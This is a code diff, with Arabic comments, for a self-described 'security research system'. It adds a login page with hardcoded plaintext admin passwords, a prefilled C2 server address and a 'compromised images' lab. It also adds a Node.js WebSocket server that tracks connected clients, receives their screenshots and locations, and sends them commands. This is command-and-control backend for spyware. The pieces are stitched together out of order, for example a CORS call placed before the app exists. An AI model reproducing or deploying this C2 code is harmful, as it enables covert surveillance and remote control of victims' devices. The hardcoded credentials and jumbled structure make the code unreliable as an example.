+    'admin': { password: 'Admin@2024', level: 'super', name: 'مدير النظام' },
+    'researcher': { password: 'Research@2024', level: 'normal', name: 'باحث' },
+    'monitor': { password: 'Monitor@2024', level: 'view', name: 'مراقب' }
+};
+
+let currentUser = null;
+
+function login() {
+    const username = document.getElementById('loginUsername').value.trim();
+    const password = document.getElementById('loginPassword').value;
+    
+    if (users[username] && users[username].password === password) {
+        currentUser = {
+            username: username,
+            ...users[username]
+        };
+        
+        // تسجيل الدخول الناجح
+        document.getElementById('loginScreen').style.display = 'none';
+        document.querySelector('.container').style.display = 'block';
+        
+        // تحديث العنوان ليشمل اسم المستخدم
+        const title = document.querySelector('.university-badge');
+        if (title) {
+            title.innerHTML += ` <span style="color: #2ed573; margin-right: 10px;">| 👤 ${currentUser.name}</span>`;
+        }
+        
+        // إضافة زر تسجيل الخروج
+        const header = document.querySelector('.header');
+        const logoutBtn = document.createElement('button');
+        logoutBtn.innerHTML = '<i class="fas fa-sign-out-alt"></i> تسجيل الخروج';
+        logoutBtn.style.cssText = 'position: absolute; left: 30px; top: 30px; background: rgba(255, 71, 87, 0.2); color: #ff4757; border: 1px solid rgba(255, 71, 87, 0.3); padding: 10px 20px; border-radius: 50px; cursor: pointer; font-size: 0.9rem;';
+        logoutBtn.onclick = logout;
+        header.style.position = 'relative';
+        header.appendChild(logoutBtn);
+        
+        // بدء النظام
+        if (!researchSystem) {
+            researchSystem = new AdvancedSecurityResearchSystem();
+        }
+        
+        researchSystem.log(`✅ تم تسجيل الدخول: ${currentUser.name} (${username})`, 'success');
+        researchSystem.log(`🔐 مستوى الصلاحيات: ${currentUser.level}`, 'info');
+        
+    } else {
+        alert('❌ اسم المستخدم أو كلمة المرور غير صحيحة!');
+    }
+}
+
+function logout() {
+    if (confirm('هل تريد تسجيل الخروج؟')) {
+        if (researchSystem) {
+            researchSystem.log(`👋 تسجيل خروج: ${currentUser.username}`, 'warning');
+        }
+        
+        currentUser = null;
+        document.getElementById('loginScreen').style.display = 'flex';
+        document.querySelector('.container').style.display = 'none';
+        
+        // إعادة تعيين حقول الدخول
+        document.getElementById('loginUsername').value = 'admin';
+        document.getElementById('loginPassword').value = 'Admin@2024';
+    }
+}
+
+// منع الوصول المباشر للوظائف بدون تسجيل دخول
+function requireLogin() {
+    if (!currentUser) {
+        alert('⚠️ يرجى تسجيل الدخول أولاً');
+        return false;
+    }
+    return true;
+}
+
+// تعديل دوال النظام لتفعيل تسجيل الدخول
+function initializeFullSystem() {
+    if (!requireLogin()) return;
+    
+    if (!researchSystem) {
+        researchSystem = new AdvancedSecurityResearchSystem();
+        researchSystem.log('🚀 إنشاء مثيل جديد للنظام', 'info');
+    }
+    
+    researchSystem.log('🔧 بدء تهيئة النظام...', 'info');
+    setTimeout(() => {
+        researchSystem.initialized = true;
+        researchSystem.log('✅ النظام مهيأ وجاهز للعمل', 'success');
+    }, 2000);
+}
+
+// تعديل باقي الدوال بنفس الطريقة
+function showMonitoringControl() {
+    if (!requireLogin()) return;
+    alert('👁️ لوحة التحكم في المراقبة - قيد التطوير');
+    if (researchSystem) {
+        researchSystem.log('فتح لوحة التحكم في المراقبة', 'info');
+    }
+}
+
+function showRemoteControl() {
+    if (!requireLogin()) return;
+    alert('🎮 لوحة التحكم عن بعد - قيد التطوير');
+    if (researchSystem) {
+        researchSystem.log('فتح لوحة التحكم عن بعد', 'info');
+    }
+}
+
+function showDataCollection() {
+    if (!requireLogin()) return;
+    alert('💾 نظام جمع البيانات - قيد التطوير');
+    if (researchSystem) {
+        researchSystem.log('فتح نظام جمع البيانات', 'info');
+    }
+}
+
+function startFullResearch() {
+    if (!requireLogin()) return;
+    
+    if (researchSystem && researchSystem.initialized) {
+        researchSystem.log('🔬 بدء البحث الشامل...', 'warning');
+        researchSystem.monitoringActive = true;
+        alert('✅ بدء البحث الشامل');
+    } else {
+        alert('⚠️ يرجى تهيئة النظام أولاً');
+    }
+}
+
+function emergencyStop() {
+    if (!requireLogin()) return;
+    
+    if (confirm('🚨 توقف طارئ - هل أنت متأكد؟')) {
+        if (researchSystem) {
+            researchSystem.log('⛔ تنشيط التوقف الطارئ!', 'critical');
+            researchSystem.monitoringActive = false;
+            alert('🛑 تم إيقاف جميع العمليات');
+        }
+    }
+}
+
+// تعديل تهيئة الصفحة
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('🚀 نظام البحث الأمني المتقدم - جاهز للتهيئة');
+    console.log('🔐 يرجى تسجيل الدخول للوصول للنظام');
+    
+    // إخفاء المحتوى الرئيسي حتى تسجيل الدخول
+    document.querySelector('.container').style.display = 'none';
+    
+    // إنشاء نظام البحث (يتم تفعيله بعد الدخول)
+    researchSystem = new AdvancedSecurityResearchSystem();
+    
+    // تهيئة حقل C2
+    const c2Field = document.getElementById('c2Server');
+    if (c2Field) {
+        c2Field.value = 'ws://c2.lab-research.net:8443';
+    }
+    
+    console.log('🎨 نظام توليد الصور المخترقة جاهز للعمل');
+    
+    // إضافة مفتاح اختصار لفتح المختبر (Ctrl+Alt+G)
+    document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && e.altKey && e.key === 'g') {
+            e.preventDefault();
+            toggleImageLab();
+        }
+    });
+});
+app.use(cors({
+  origin: "*",
+  credentials: true
+}));
+
+// server.js على Render
+const WebSocket = require('ws');
+const express = require('express');
+const app = express();
+
+// Middleware
+app.use(express.json());
+
+// WebSocket Server
+const server = require('http').createServer(app);
+const wss = new WebSocket.Server({ server });
+
+const clients = new Map();
+
+wss.on('connection', (ws, req) => {
+    const clientId = Date.now() + Math.random().toString(36).substr(2, 9);
+    
+    clients.set(clientId, {
+        ws: ws,
+        ip: req.socket.remoteAddress,
+        connectedAt: new Date()
+    });
+    
+    console.log(`New client: ${clientId}`);
+    
+    ws.on('message', (data) => {
+        try {
+            const message = JSON.parse(data);
+            console.log(`Message from ${clientId}:`, message.type);
+            
+            // معالجة الرسائل
+            switch(message.type) {
+                case 'handshake':
+                    handleHandshake(clientId, message);
+                    break;
+                case 'screenshot_result':
+                    saveScreenshot(clientId, message);
+                    break;
+                case 'location_result':
+                    saveLocation(clientId, message);
+                    break;
+            }
+        } catch (error) {
+            console.error('Error:', error);
+        }
+    });
+    
+    ws.on('close', () => {
+        console.log(`Client disconnected: ${clientId}`);
+        clients.delete(clientId);
+    });
+});
+
+// HTTP Routes
+app.get('/api/clients', (req, res) => {
+    const clientList = Array.from(clients.entries()).map(([id, data]) => ({
+        id,
+        ip: data.ip,
+        connectedAt: data.connectedAt
+    }));
+    res.json(clientList);
+});
+
+app.post('/api/command', (req, res) => {
+    const { clientId, command } = req.body;
+    const client = clients.get(clientId);
+    
+    if (client && client.ws.readyState === 1) {
+        client.ws.send(JSON.stringify(command));
+        res.json({ success: true });
+    } else {
+        res.status(404).json({ error: 'Client not found' });
+    }
+});
+
+const PORT = process.env.PORT || 3001;
+server.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
+});
+// في Frontend (Netlify)
+const BACKEND_WS_URL = 'wss://security-backend.onrender.com';
+
+// في Backend (Render)
+const FRONTEND_URL = 'https://your-site.netlify.app';
+    </script>
+</body>
+</html>
